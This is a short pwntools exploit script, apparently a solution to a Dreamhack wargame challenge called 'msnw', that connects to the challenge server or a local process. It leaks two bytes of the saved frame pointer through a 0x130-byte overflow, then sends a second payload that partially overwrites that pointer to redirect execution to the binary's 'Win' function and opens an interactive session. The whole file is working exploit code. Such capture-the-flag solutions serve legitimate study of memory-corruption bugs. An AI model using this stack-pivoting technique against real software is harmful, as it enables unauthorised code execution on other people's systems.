#!/usr/bin/env python3

from pwn import *

exe = ELF("./deploy/msnw")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 9525)

    return r


def main():
    r = conn()
    
    payload = b"A" * 0x130
    
    r.sendafter(b": ", payload)
    r.recvuntil(payload)
    sfp_lower2 = u16(r.recvn(2))

    payload = b"A" * 16
    payload += p64(exe.symbols["Win"])
    payload += b"A" * (0x130 - len(payload))
    payload += p16(sfp_lower2 - 0x328) 

    r.sendafter(b": ", payload)
    
    r.interactive()


if __name__ == "__main__":
    main()